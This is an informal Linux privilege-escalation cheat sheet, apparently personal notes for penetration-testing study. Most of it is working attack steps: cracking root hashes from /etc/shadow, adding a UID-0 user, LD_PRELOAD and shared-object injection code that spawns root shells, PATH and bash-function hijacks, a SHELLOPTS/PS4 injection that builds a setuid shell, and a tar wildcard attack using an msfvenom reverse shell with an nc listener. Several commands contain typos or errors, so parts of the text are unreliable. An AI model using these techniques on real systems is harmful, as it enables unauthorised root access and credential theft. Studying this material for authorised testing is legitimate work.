## Permissions
User accounts are configured in /etc/passwrd
User password hashes are stored in /etc/shadow
User identified by user id (UID)

Each file has owner, group and all other permissions.

setuid (SUID)
when set files will get executed with priviledges of the owner

setgid(SGID)
when set on a file, the file will get executed with privileges of the group

## User Is
real,effective or saved
```
id
```

## Tools
Linux Smart Enumeration and LinEnum
https://github.com/diego-treitos/linux-smart-enumeration

lse


## Kernal exploit
```
uname -a
searchsploit
```

## service exploit

ps aux | grep "^root"

### Version number enumeration
<program> --version
<program> -v 

Degbian
dpkg -l | grep <program>

Rpm

rpm -qa | grep <program>

## Port Forwarding
Some instances, a root process may be bound to an internal port through with it communicates

ssh -R <local-port>:127.0.0.01:<service-port> <usermane>@<local-machine>

## Weak file permissions
### Readable /etc/shadow
ls -l /etc/shadow
head -n 1 /etc/shadow to get password hash of the root.  Password hash is in between ":"
sha512 starts with %6%
crack:  john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt [hash value]

### Writable /etc/shadow
create new password:
    mkpasswd -m sha-512 [password]
copy the above password and replace root password with above in /etc/shadow
su root
    [password]

### Writable /etc/password
second field of user row can contain password hash and will take precendant over /etc/shadow
openssl passwd "[password]"
if you can only append /etc/password you can create a new user with uid 0
    newroot:[password hash]:0:0:root:/root:/bin/bash
     su newroot

## Sudo
sudo <program> :  run as root
sudo -u <username> <program>
sudo -l  (list programs a user is allowed or disallowed to run)

sudo  su  (switch user)
sudo -s 
sudo -i
sudo /bin/bash
sudo passwd

### Shell escape sequences
https://gtfobins.github.io/


### Abusing Intended Functionality 
If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys)
for example:
    sudo apache -f /etc/shadow
    - will error out by printing the first line of the file. In this case giving us the root password hash

### Enviornment Variables
In /etc/sudoers file, if the env_reset option is set, sudo will run programs in a new, minimal environment

The env_keep option can be used to keep certain environment variables from the user's environment

The configured options are displayed when running sudo -l

* LD_PRELOAD: env var for path for a shared object (.so) file
```
    gcc -fPIC -shared -nostartfiles -g [filename]  [souce file with shell exec]
    sudo LD_PRELOAD=[filename] command
```

* LD_LIBRARY_PATH : env var contains a set of directories where shared libraries are searched for first
  ldd command can be used to print the shared libraries used by a program
  ```
  ldd /usr/bin/apache2
  gcc -o [shared opject filename] -shared -fPIC [source file with shell exec]
  sudo LD_LIBRARY_PATH=.  apache2
  ```
 
 ## Cron Jobs
 Cron jobs are run with the security level of the user who owns them

 Cron table files (crontabs) store the configuration for cron jobs
 User crontabs are usually located in /var/spool/cron/  or /var/spool/cron/crotabs/
The system-wide crontab is located at /etc/crontab

### File permissions
Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation

linux smart enumeration
```
./lse.sh -l 1 -i | more
cat /etc/crontab
locate overwrite.sh
vim overwrite.sh
```

### Path Environment Variable
* The crontab PATH environment variable is by default set to /usr/bin:/bin
* The PATH variable can be overwritten in the crontab file
* If a cron job program does not use absolute path, and one of the PATH directories is writable by the user, we may be able to create a program with the same name as the cron job


### Wildcards
* When a wildcard char is provided to a command as part of an argument, the shell will first perform filename expansion on the wildcard
* This process replaces the wildcard with a space-seperated list of the file and directory names in the current directory
* An easy way to see this in action is to run the following command from your home directory:
```
echo * 
```
Since filesystems in Linux are generally very permissive with filenames and filename expansion happens before the command is executed, it is possible to pass command line options (e.g -h) to commands by creating files with these names

```
ls *
touch ./-1
ls *
```

https://gtfobins.github.io/ can help determine whether a command has command line options which will be useful for our purposes

Example:
```
cat /etc/crontab
#locate a shell script and view contents
cat /usr/local/bin/compress.sh
       #! /bin/sh
       cd /home/usr
       tar czf /tmp/backup.tar.gz *
# from https://gtfobins.github.io/  we see tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# Use msfvenom to create revese shell binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f elf -o shell.elf
#copy the shell.elf to compromised system and make it executable
touch ./--checkpoint=1
touch ./--checkpoint-action=shell.elf
#listen on port
nc -nvlp port
```

##
## SUID/SGID Files
SUID files get executed with priviliges of the file owner
SGID files get executed with the priviliges of the file group
If the file is owned by the root, it get executed with root priviliges, and we may be able to use it to escalate priviliges.

Use following command to list files with SGID or SUID set
```
find /-type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Use https://gtfobins.github.io/ to find shell escape sequences

### Search vuln 
Search for vuln in files with SGID or SUID set
```
searchsploit <file>  <version>
```

### Shared Object Injection
*When a program is executed, it will try to load the shared objects it requires
By using strace, we can track these system calls and determing whether any shared objects were not found
If we can write to the location the program tries to open, we can create a shared object and spawn a root shell

Example
```
./lse.sh -l 1 -i | more
#locate files with SUID set
strace [file] 2 >&1 | grep -iE "open|access|no such file"
#locate a so in a location you can write.  Create that so file...if found libcalc.so
vim libcal.c
         #include <stdio.h>
         #include <stdlib.h>
         static void  init __attribute__((constructor)) 
         void init(){setuid(0);system("/bin/bash -p");}' 
gcc -shared -fPIC -o libcalc.so libacal.c
#execute file that will load the above .so
```

### Path Environment Variable
### No path
* The PATH env var contains a list of directories where the shell should try to find programs
* If a program tries to execute another program, but only specifies the progam name, rather than its full (absolute) path, the shell will search the PATH directories until it is found
* Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

* We can run **strings** command on executable to find strings of characters.**strace** and  **ltrace** can also be helpful

```
strings <command>
strace -v -f execve <command> 2>&1 | grep <exec from above>
ltrace <command>
```

Example if **service** command  is called:
```
vim service.c
    int main() {
        setuid(0);
        system("/bin/bash -p);
    }
gcc service service.c
#Prepend current directory to path
PATH=.:$PATH
#execute the file
```

### Full path specified
Bash versions lower than 4.2.048 it is possible to define user functions with absolute path name.  These functions take precedence pver the actual executable being called

```
#for example the command is
/usr/sbin/service ...
#then
/bin/sh --version 
# less than 4.2.048
function /usr/bin/service { /bin/bash -p; }
export  -f /usr/bin/service
#execute the file with /usr/sbin/service
```

### Abusing shell features
* Bash has a debugging mode which can be enabled with the -x command line option, or by modifying the SHELLOPTS environment var to include xtrace
* By default SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.
* When in debugging mode, BASH uses the env varialbe PS4 to display extra prompt for debug statements.  This variable can include embedded command, which will execute every time it is shown
```
#test
env -i SHELLOPTS=xtrace PS4='$(whoami)' <command>
#execute
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash  /tmp/rootbash; chmod +s /tmp/rootbash)' <command>
/tmp/rootbash -p
```

## Passwords
Look for passwords in config file
```
ls
```

History files can have passwords

```
ls -a
# look for *_history files
cat .bash_history
```

## SSH Keys
if you can find private key you can use it


## NFS
Network file Share
configured in /etc/exports
```
showmount -e <target>
#or
nmap -sV --script=nfs-showmount <target>
#mount
mount -o rw,vers=2 <target>:<share> <local_directory>
```

### Root Squashing
if someone tries to connect as root, NFS treats them as NOBODY user.
you can turn off this by setting no_root_squash config option

create a reverse shell and copy to remote share


## Strategy
1. Check your user (id, whoami)
2.  Run Linux Smart Enumaration Script  (Starting with Level 0, 1, 2)
3.  Run LinEnum and other scripts too
4.  If your scripts are failing, run manual commands 
5.  Cheatsheet:  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation

